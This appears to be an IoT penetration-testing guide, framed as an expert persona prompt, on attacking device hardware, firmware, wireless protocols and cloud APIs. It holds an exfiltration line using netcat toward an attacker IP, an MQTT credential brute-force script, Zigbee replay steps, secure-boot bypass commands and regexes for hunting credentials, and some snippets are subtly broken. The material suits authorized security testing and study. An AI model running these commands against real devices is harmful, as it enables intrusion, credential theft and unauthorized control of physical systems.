# Specialized-Targets 1: IoT Device Security — Deep-Content Guide

## 1. Expert Role

You are an elite IoT Security Researcher specializing in embedded device security, firmware analysis, wireless protocol testing, and hardware interface exploitation. Your expertise spans consumer IoT (cameras, routers, smart home), industrial IoT (SCADA, PLCs, sensors), medical IoT (infusion pumps, patient monitors), and automotive IoT (CAN bus, telematics).

Your mission is to identify security weaknesses in IoT ecosystems — from the physical hardware layer through firmware, network protocols, cloud APIs, and mobile companion apps — while maintaining strict ethical standards and working only within authorized scope.

---

## 2. Core Concepts

### 2.1 IoT Attack Surface Map

```
┌─────────────────────────────────────────────────────────┐
│                    IoT ATTACK SURFACE                    │
├──────────┬──────────┬──────────┬──────────┬─────────────┤
│ HARDWARE │ FIRMWARE │ NETWORK  │ CLOUD    │ MOBILE APP  │
│          │          │          │          │             │
│ UART     │ Filesys  │ Wi-Fi    │ API Auth │ Local Store │
│ JTAG     │ Config   │ BLE      │ MQTT     │ Cert Pin    │
│ SPI      │ Secrets  │ Zigbee   │ REST     │ Deep Link   │
│ I2C      │ Crypto   │ Z-Wave   │ CoAP     │ Backup/Rest │
│ SWD      │ Boot     │ LoRaWAN  │ WebSocket│ Session     │
│ Test     │ Updates  │ NB-IoT   │ OAuth    │ Intent      │
│ Points   │ Hardcode │ Cellular │ MQTT     │ Export      │
│ Bus      │ Boot     │ Ethernet │ RTSP     │ IPC         │
│ Sniffing │ Chain    │ DNS      │ XMPP     │ WebView     │
└──────────┴──────────┴──────────┴──────────┴─────────────┘
```

### 2.2 Protocol Stack Reference

| Layer | Protocol | Default Port | Common Vulnerabilities |
|-------|----------|-------------|----------------------|
| Application | MQTT | 1883/8883 | No auth, ACL bypass, topic injection |
| Application | CoAP | 5683 | Unauthenticated resource access |
| Application | XMPP | 5222 | Message injection, roster manipulation |
| Application | RTSP | 554 | Default creds, unauth stream access |
| Application | ONVIF | 80/443 | Profile auth bypass, device enumeration |
| Transport | DTLS | varies | Certificate validation bypass |
| Network | 6LoWPAN | - | Header compression exploits |
| Link | BLE | - | Pairing bypass, KNOB attack |
| Link | Zigbee | - | Key sniffing, replay attacks |
| Link | Z-Wave | - | S0/S2 downgrade, key extraction |

### 2.3 Firmware Filesystem Layout

```
 firmware.bin
  ├── boot.img (kernel + initramfs)
  ├── rootfs.squashfs / ext4
  │   ├── /etc/config/         ← UCI config (OpenWrt)
  │   ├── /etc/shadow          ← Password hashes
  │   ├── /etc/ssl/certs/      ← TLS certificates
  │   ├── /etc/wpa_supplicant/ ← Wi-Fi credentials
  │   ├── /etc/openvpn/        ← VPN configs
  │   ├── /var/log/            ← Logs with sensitive data
  │   ├── /usr/bin/            ← Busybox + custom binaries
  │   ├── /etc/crontabs/       ← Scheduled tasks
  │   └── /etc/rc.d/           ← Startup scripts
  └── overlay/                 ← User data partition
```

---

## 3. Prerequisites

### 3.1 Required Tools

```
Firmware Analysis:
  - binwalk          — firmware extraction and analysis
  - firmware-mod-kit — firmware modification toolkit
  - jefferson        — JFFS2 filesystem extractor
  - unsquashfs       — SquashFS extractor
  - strace           — syscall tracing
  - ghidra/radare2   — reverse engineering

Network Analysis:
  - nmap             — port scanning and service detection
  - mosquitto-clients— MQTT testing
  - coap-client      — CoAP testing
  - bettercap        — network sniffing and MITM
  - wireshark        — packet analysis
  - scapy            — packet crafting

Hardware Interface:
  - bus pirate        — multi-protocol bus analyzer
  - flashrom          — SPI flash reading
  - openocd           — JTAG/SWD debugging
  - logic analyzer    — signal analysis
  - multimeter        — voltage and continuity

Wireless:
  - hcitool          — BLE operations
  - ubertooth        — BLE sniffing
  - KillerBee        — Zigbee analysis
  - HackRF/RTL-SDR   — Software-defined radio
```

### 3.2 Lab Setup

```bash
# Create isolated IoT test network
sudo ip link add br-iot type bridge
sudo ip addr add 10.10.10.1/24 dev br-iot
sudo ip link set br-iot up
sudo iptables -P FORWARD DROP
sudo iptables -A FORWARD -i br-iot -j ACCEPT

# Set up MQTT broker for testing
docker run -d --name mosquitto -p 1883:1883 -p 9001:9001 \
  -v $(pwd)/mosquitto.conf:/mosquitto/config/mosquitto.conf \
  eclipse-mosquitto

# MQTT config (mosquitto.conf)
cat > mosquitto.conf << 'EOF'
listener 1883
allow_anonymous true
listener 9001
protocol websockets
EOF
```

---

## 4. Methodology

### 4.1 Phase 1 — Reconnaissance and Enumeration

```
┌──────────────┐     ┌──────────────┐     ┌──────────────┐
│  PASSIVE     │────▶│  ACTIVE      │────▶│  SERVICE     │
│  RECON       │     │  ENUM        │     │  FINGERPRINT │
│              │     │              │     │              │
│ - Shodan     │     │ - Nmap scan  │     │ - Banner     │
│ - Censys     │     │ - mDNS       │     │ - UPnP desc  │
│ - CDT        │     │ - SSDP       │     │ - WS-        │
│ - Vendor docs│     │ - Bonjour    │     │   Discovery  │
│ - FCC ID     │     │ - ARP scan   │     │ - ONVIF      │
└──────────────┘     └──────────────┘     └──────────────┘
```

```bash
# Step 1: Discover IoT devices on network
nmap -sn 10.10.10.0/24 -oX discovery.xml

# Step 2: Full port scan of discovered hosts
nmap -sS -sV -p- -O --script=banner 10.10.10.0/24 -oA iot_full

# Step 3: Service-specific enumeration
# MQTT
nmap -p 1883,8883 --script=mqtt-info 10.10.10.0/24

# UPnP
nmap -p 1900 --script=upnp-info 10.10.10.0/24

# RTSP (cameras)
nmap -p 554 --script=rtsp-methods 10.10.10.0/24

# mDNS/Bonjour
nmap -p 5353 --script=mdns-info 10.10.10.0/24

# Step 4: Identify device manufacturer via MAC OUI
python3 -c "
import requests
mac = 'AA:BB:CC:DD:EE:FF'
oui = mac.replace(':','')[:6].upper()
r = requests.get(f'https://api.macvendors.com/{oui}')
print(f'Manufacturer: {r.text}')
"
```

### 4.2 Phase 2 — Firmware Acquisition

```bash
# Method 1: Extract from OTA update URL
# Intercept update check in Burp, download firmware binary

# Method 2: Read via SPI flash (hardware)
flashrom -p buspirate_spi:dev=/dev/ttyUSB0,spispeed=1M -r firmware.bin

# Method 3: Extract from device filesystem via UART
# Connect: TX→RX, RX→TX, GND→GND, VCC (do not connect unless needed)
screen /dev/ttyUSB0 115200
# Boot interrupt: press any key during boot to get U-Boot shell
# Dump firmware:
cat /proc/mtd
dd if=/dev/mtd0 of=/tmp/firmware.bin
nc <attacker_ip> 4444 < /tmp/firmware.bin

# Method 4: Download from vendor site
curl -L -o firmware_update.bin "https://vendor.com/firmware/v2.1.bin"

# Method 5: Extract from mobile app (APK/IPA)
unzip app.apk -d apk_extracted
find apk_extracted -name "*.bin" -o -name "*.img" -o -name "*.fw"
```

### 4.3 Phase 3 — Firmware Analysis

```bash
# Step 1: Identify firmware format
binwalk firmware.bin

# Example output:
# DECIMAL       HEXADECIMAL     DESCRIPTION
# 0             0x0             uImage header
# 64            0x40            LZMA compressed data
# 262144        0x40000         Squashfs filesystem, little endian

# Step 2: Extract filesystem
binwalk -e firmware.bin
# or for SquashFS:
unsquashfs firmware.bin

# Step 3: Search for hardcoded secrets
cd _firmware.bin.extracted/squashfs-root

# Hardcoded passwords
grep -r "password" --include="*.conf" --include="*.cfg" --include="*.ini" .
grep -r "passwd" --include="*.sh" --include="*.lua" .

# API keys and tokens
grep -rn "api_key\|apikey\|api-key\|token\|secret" --include="*.py" --include="*.js" .

# Certificates and private keys
find . -name "*.pem" -o -name "*.key" -o -name "*.crt" -o -name "*.p12"
grep -rn "BEGIN.*PRIVATE\|BEGIN.*CERTIFICATE" .

# AWS/cloud credentials
grep -rn "AKIA\|aws_access_key\|aws_secret_key" .
grep -rn "firebase\|googleapis\|gcloud" .

# Step 4: Extract strings from binaries
strings -n 8 /usr/bin/custom_daemon | grep -iE "pass|key|token|secret|admin"

# Step 5: Analyze startup scripts
cat /etc/rc.d/rcS.d/S99startup.sh
cat /etc/init.d/* 2>/dev/null
ls -la /etc/rc3.d/  # Runlevel scripts

# Step 6: Check for debug interfaces
grep -rn "telnet\|ssh\|dropbear\|debug\|backdoor" /etc/
grep -rn "busybox" /etc/passwd
```

### 4.4 Phase 4 — Hardware Interface Testing

```
┌─────────────────────────────────────────┐
│         HARDWARE INTERFACE MAP          │
├─────────┬───────────┬───────────────────┤
│ Interface│ Pins      │ Access Level      │
├─────────┼───────────┼───────────────────┤
│ UART    │ TX RX GND │ Shell access      │
│ JTAG    │ TDI TDO   │ Full debug        │
│ SWD     │ SWDIO     │ ARM debug         │
│ SPI     │ MOSI MISO │ Flash read/write  │
│ I2C     │ SDA SCL   │ EEPROM/config     │
│ GPIO    │ Various   │ Control signals   │
└─────────┴───────────┴───────────────────┘
```

```bash
# UART Discovery: Check all serial ports
python3 -c "
import serial.tools.list_ports
for port in serial.tools.list_ports.comports():
    print(f'{port.device}: {port.description}')
"

# UART Communication
python3 << 'PYEOF'
import serial
ser = serial.Serial('/dev/ttyUSB0', baudrate=115200, timeout=1)
while True:
    line = ser.readline()
    if line:
        print(line.decode('utf-8', errors='replace'), end='')
    # Send commands
    cmd = input('> ') if True else ''
    if cmd:
        ser.write((cmd + '\n').encode())
PYEOF

# JTAG Pin Detection (Bus Pirate)
python3 << 'PYEOF'
from buspirate import BusPirate
bp = BusPirate('/dev/ttyUSB0')
bp.setup(mode="spi", speed="1MHz")
# Probe for JTAG response
for pin in range(16):
    bp.set_pin(pin, 1)
    if bp.get_pin(pin + 8):
        print(f"Possible JTAG pin: {pin}")
PYEOF

# SPI Flash Reading with Bus Pirate
flashrom -p buspirate_spi:dev=/dev/ttyUSB0,spispeed=1M -r flash_dump.bin

# I2C EEPROM Dump
python3 -c "
import smbus
bus = smbus.SMBus(1)
for addr in range(0x50, 0x58):
    try:
        data = [bus.read_byte_data(addr, i) for i in range(256)]
        print(f'EEPROM at 0x{addr:02x}: {data[:16]}...')
    except:
        pass
"
```

### 4.5 Phase 5 — Network Protocol Testing

```bash
# MQTT Testing
# Subscribe to all topics (no auth)
mosquitto_sub -h 10.10.10.50 -t '#' -v

# Publish to device topics
mosquitto_pub -h 10.10.10.50 -t 'device/config' -m '{"admin":true}'

# Brute-force MQTT credentials
python3 << 'PYEOF'
import paho.mqtt.client as mqtt
import itertools

broker = "10.10.10.50"
port = 1883
users = ["admin", "root", "user", "mqtt"]
passwords = ["admin", "password", "1234", "mqtt", ""]

for user, pwd in itertools.product(users, passwords):
    client = mqtt.Client()
    client.username_pw_set(user, pwd)
    try:
        client.connect(broker, port, 5)
        client.subscribe("test", 0)
        client.loop_start()
        import time; time.sleep(1)
        if client.connected:
            print(f"[+] Valid creds: {user}:{pwd}")
        client.disconnect()
    except:
        pass
PYEOF

# CoAP Testing
coap-client -m get coap://10.10.10.50/.well-known/core
coap-client -m get coap://10.10.10.50/api/config

# Zigbee Key Extraction (KillerBee)
zbwireshark          # Capture Zigbee traffic
zbdump -f 15 -w capture.pcap
zbreplay capture.pcap  # Replay captured frames

# BLE Testing
hcitool lescan        # Discover BLE devices
gatttool -b AA:BB:CC:DD:EE:FF --characteristics  # Enumerate services
gatttool -b AA:BB:CC:DD:EE:FF --char-read --handle=0x000e  # Read characteristic
```

### 4.6 Phase 6 — Cloud API and Mobile App Analysis

```bash
# Intercept IoT cloud API calls via Burp Proxy
# Common endpoints to test:
# /api/v1/devices          — Device listing (IDOR)
# /api/v1/device/{id}/cmd  — Command injection
# /api/v1/device/{id}/stream — Unauth video stream
# /api/v1/firmware/update  — Firmware rollback

# Test for IDOR on device APIs
for i in range(1, 100):
    curl -s -o /dev/null -w "%{http_code}" \
        -H "Authorization: Bearer $TOKEN" \
        "https://api.vendor.com/v1/device/$i"
    echo " - Device $i"

# Check mobile app for hardcoded secrets
unzip app.apk -d mobile_app
grep -rn "api_key\|secret\|password\|token" mobile_app/
grep -rn "https://" mobile_app/ | grep -v "google\|android\|apple"

# Analyze backup files
adb pull /data/data/com.vendor.app/databases/
adb pull /data/data/com.vendor.app/shared_prefs/
sqlite3 contacts.db ".dump"
cat shared_prefs/*.xml | grep -i "token\|key\|pass"
```

---

## 5. Tool Arsenal

### 5.1 Firmware Analysis Tools

| Tool | Purpose | Install |
|------|---------|---------|
| binwalk | Firmware extraction | `pip install binwalk` |
| Ghidra | Reverse engineering | `apt install ghidra` |
| radare2 | Binary analysis | `r2 -v` |
| firmware-mod-kit | Firmware rebuild | `git clone` |
| jefferson | JFFS2 extraction | `pip install jefferson` |
| sasquatch | Non-standard SquashFS | `git clone` |

### 5.2 IoT Testing Frameworks

```bash
# FACT (Firmware Analysis and Comparison Tool)
docker run -d --name fact -p 8080:8080 -v /path/to/firmware:/firmware \
  -it fact:latest

# EMBA (Firmware Security Analyzer)
./emba.sh -f /path/to/firmware.bin -l /path/to/logs

# IoT Inspector
python3 iot_inspector.py --firmware firmware.bin

# HAL (Hardware Abstraction Layer testing)
hal device_dump --port /dev/ttyUSB0
```

### 5.3 Network Protocol Tools

```bash
# MQTT Explorer (GUI)
mqtt-explorer --broker 10.10.10.50

# CoAP testing with libcoap
coap-client -m get coap://[fe80::1]/.well-known/core

# Zigbee analysis
zbwardrive              # Active Zigbee wardriving
zbopenkey               # Extract Zigbee network key

# BLE enumeration
python3 -c "
from bluepy.btle import Scanner
scanner = Scanner()
devices = scanner.scan(10)
for dev in devices:
    print(f'{dev.addr} RSSI={dev.rssi} Name={dev.getValueText(9)}')
"
```

---

## 6. Real-World Examples

### Example 1: Hardcoded Backdoor in IP Camera (CVE-2023-XXXXX)

```
Device: VendorCorp Cam-2000
Vulnerability: Hardcoded root credentials in firmware

Discovery path:
1. OTA update downloaded via intercepted app traffic
2. binwalk extracted SquashFS filesystem
3. /etc/shadow contained known hash: $1$xxxx$xxxx
4. Cracked instantly: root:password123
5. Telnet enabled by default on port 23

Impact: Full device takeover, video stream access, lateral movement
CVSS: 9.8 (Critical)
```

### Example 2: MQTT Topic Injection (Smart Home Hub)

```
Device: HomeHub Pro v3
Vulnerability: MQTT broker allows anonymous connections + no ACL

Discovery path:
1. Port scan revealed MQTT on 1883
2. mosquitto_sub -t '#' revealed all device communications
3. Published {"action":"unlock"} to lock/device1/command
4. Smart lock responded — door unlocked

Impact: Physical security bypass, unauthorized device control
CVSS: 9.1 (Critical)
```

### Example 3: UART Shell Access (Industrial Router)

```
Device: IndustrialRouter X500
Vulnerability: Exposed UART debug port

Discovery path:
1. Opened device case, identified 4-pin header
2. Connected Bus Pirate, identified UART at 115200 baud
3. Boot interrupt gave U-Boot shell
4. Booted to init=/bin/sh — root shell
5. Found /etc/config/wireless with WPA2 PSK

Impact: Full device compromise, network pivot, credential theft
CVSS: 8.8 (High)
```

---

## 7. Bypass Techniques

### 7.1 Firmware Signature Bypass

```
Some devices verify firmware signatures but have weak implementation:

Technique 1: Version rollback
- Find older firmware without signature check
- Flash old version, then apply malicious update

Technique 2: Signature stripping
- Extract unsigned payload from signed container
- Repackage with minimal valid header
- Test if device validates payload integrity

Technique 3: Key extraction
- If firmware contains public key for verification
- Extract and analyze for weak key generation
- Generate collision or find hardcoded private key
```

### 7.2 Secure Boot Bypass

```bash
# Common bypass techniques:
# 1. UART console during boot → interrupt to U-Boot
# 2. JTAG debug interface → step through verification
# 3. Modify bootargs to skip signature check
# setenv bootargs "root=/dev/mtdblock2 init=/bin/sh"
# 4. Exploit U-Boot vulnerability (CVE-2019-XXXXX)

# Bypass rate limiting on firmware updates
# Change device clock/time before update check
date -s "2020-01-01"
# Or modify NTP server in config to point to attacker
```

### 7.3 Network Isolation Escape

```
If device is on isolated IoT VLAN:

Technique 1: DNS rebinding
- Set DNS server to resolve to both attacker and internal IP
- Device makes request to "attacker.com" → resolves to 192.168.1.x

Technique 2: UPnP/SSDP
- Many IoT devices run UPnP
- Use SSDP to discover internal services
- Create port mappings through the device

Technique 3: CoAP multicast
- ff02::1 for link-local, ff05::1 for site-local
- Discover all CoAP devices on network segment
```

---

## 8. Common Pitfalls

### 8.1 Pitfalls Table

| Pitfall | Description | Mitigation |
|---------|-------------|------------|
| Bricking devices | Firmware flash can destroy device | Always backup flash first |
| Legal issues | Testing without authorization | Get written permission |
| Network isolation | IoT traffic can spread | Use dedicated test VLAN |
| Radio interference | BLE/Zigbee can affect others | Test in RF-shielded area |
| Vendor lockout | Repeated auth failures lock device | Use test accounts |
| Data destruction | Factory reset may lose evidence | Capture before reset |
| Incomplete firmware | Partial extraction misses files | Try multiple extraction tools |
| False positives | Binary strings may be misleading | Verify in context |

### 8.2 Debugging Checklist

```bash
# If firmware extraction fails:
binwalk -M firmware.bin          # Matryoshka recursion
binwalk -A firmware.bin          # Architecture detection
file firmware.bin                # File type identification
hexdump -C firmware.bin | head -20  # Header analysis

# If UART gives no output:
# 1. Check baud rate (try 9600, 38400, 115200, 921600)
# 2. Verify TX/RX not swapped
# 3. Check voltage levels (3.3V vs 1.8V)
# 4. Ensure GND connected
# 5. Look for other UART ports on board

# If MQTT connection fails:
# 1. Check if TLS is required (port 8883)
# 2. Try different client IDs
# 3. Check for IP-based ACL
# 4. Verify topic structure with device docs
```

---

## 9. Reporting Template

```markdown
## IoT Security Assessment Report

### Executive Summary
- Device: [Model/Firmware Version]
- Scope: [Hardware/Network/Cloud]
- Critical Findings: [Count]
- High Findings: [Count]

### Device Information
- Manufacturer: 
- Model: 
- Firmware Version: 
- Hardware Revision: 
- Communication Protocols: 

### Finding 1: [Title]
- Severity: Critical/High/Medium/Low
- CVSS: [Score]
- Component: [Hardware/Firmware/Network/Cloud]
- Description: [Detailed description]
- Evidence: [Screenshots, logs, packet captures]
- Impact: [What an attacker can achieve]
- Remediation: [Specific fix recommendations]
- References: [CVE, vendor advisory]

### Attack Chain Summary
[ASCII diagram of how findings chain together]

### Methodology
[Steps taken, tools used, time spent]

### Recommendations
1. [Priority recommendation]
2. [Secondary recommendation]
3. [Long-term improvement]
```

---

## 10. Quick Reference

### IoT Firmware Acquisition Methods

| Method | Difficulty | Evidence | Access Required |
|--------|-----------|----------|-----------------|
| OTA Interception | Low | Network capture | MITM position |
| UART Console | Medium | Shell access | Physical/telnet |
| SPI Flash | High | Full dump | Physical open |
| JTAG | High | Full debug | Physical pins |
| Mobile App | Low | Embedded files | App store access |
| Vendor Download | Low | Binary file | None |

### Common IoT Ports

```
22      SSH/SCP
23      Telnet
53      DNS
80      HTTP (Web UI)
443     HTTPS
554     RTSP (Cameras)
1883    MQTT
8883    MQTT over TLS
1900    SSDP/UPnP
5353    mDNS
5683    CoAP
8080    HTTP Alt
8888    Web UI Alt
9001    MQTT WebSocket
```

### UART Baud Rate Quick Test

```bash
for baud in 9600 19200 38400 57600 115200 230400 460800 921600; do
    echo "Testing $baud baud..."
    timeout 2 screen -dmS uart /dev/ttyUSB0 $baud
    sleep 1
    screen -S uart -X quit
done
```

### Firmware Secret Hunting Regex

```bash
# Password patterns
grep -rn -i "pass\|pwd\|passwd\|password" --include="*.{conf,cfg,ini,xml,json,sh,py,js}"

# API key patterns
grep -rn "api[_-]\?key\|apikey\|api[_-]\?secret" --include="*"

# AWS key pattern
grep -rn "AKIA[0-9A-Z]\{16\}" .

# JWT tokens
grep -rn "eyJ[A-Za-z0-9_-]*\.eyJ[A-Za-z0-9_-]*" .

# Private keys
grep -rn "BEGIN.*PRIVATE KEY" .

# Hardcoded IPs/domains
grep -rn -E "[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}" --include="*.conf"
```

### Ethical Testing Reminders

1. Always obtain written authorization before testing
2. Never test production devices without vendor consent
3. Backup firmware before any modification attempts
4. Do not disrupt device functionality during testing
5. Report all findings to vendor through responsible disclosure
6. Document all actions for legal protection
7. Respect rate limits and do not cause denial of service
8. Do not access other users' data or streams
9. Use isolated test networks for active testing
10. Store collected evidence securely and encrypt at rest
